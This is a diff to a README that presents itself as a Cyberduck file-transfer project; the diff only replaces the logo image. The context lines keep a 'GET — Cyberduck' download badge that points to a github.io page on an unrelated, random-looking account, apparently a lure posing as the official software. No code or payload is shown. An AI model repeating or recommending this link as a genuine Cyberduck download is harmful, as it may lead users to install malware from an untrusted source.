@@ -1,6 +1,6 @@
 # Cyberduck File Transfer — FTP, SFTP, S3 & Remote Storage Workflows
 
-![Cyberduck Logo](https://www.turhost.com/blog/wp-content/uploads/2020/11/yazi-ici-gorsel-4.jpg)
+![Cyberduck Logo](https://85ideas.com/wp-content/uploads/2015/05/Cyberduck-1024x493.png)
 
 [![GET — Cyberduck](https://img.shields.io/badge/GET%20%E2%80%94%20Cyberduck-0078D6?style=for-the-badge&logoColor=white)](https://majlietq717873.github.io/.github/Cyberduck-File-Transfer)
 
